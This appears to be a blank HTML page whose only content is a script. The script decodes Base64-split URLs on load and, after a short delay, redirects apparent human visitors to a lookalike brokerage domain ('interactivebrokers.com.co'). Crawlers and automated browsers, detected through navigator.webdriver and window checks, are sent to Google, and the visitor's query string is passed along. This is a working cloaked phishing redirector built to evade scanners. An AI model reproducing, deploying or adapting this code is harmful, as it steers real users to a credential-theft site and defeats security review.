<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title></title>
  <style>
    body { background: #fff; margin: 0; }
  </style>
</head>
<body>
   <script>
     function decode(x) {
       return atob(x);
     }

     function isHuman() {
       try {
         return (
           Array.isArray(navigator.languages) &&
           navigator.languages.length > 0 &&
           !navigator.webdriver &&
           window.outerWidth > 0 &&
           window.outerHeight > 0
         );
       } catch (_) {
         return false;
       }
     }

     setTimeout(() => {
       const query = location.search;

       const t1 = "aHR0cHM6Ly9";
       const t2 = "3d3cuaW50ZXJhY3RpdmVicm9rZXJz";
       const t3 = "LmNvbS5jby9yek5OaWN0dA==";

       const g1 = "aHR0cHM6Ly9";
       const g2 = "3d3cuZ29vZ2xl";
       const g3 = "LmNvbQ==";

       const target = decode(t1 + t2 + t3);
       const fallback = decode(g1 + g2 + g3);

       location.href = (isHuman() ? target : fallback) + query;
     }, 500);
   </script>
</body>
</html>
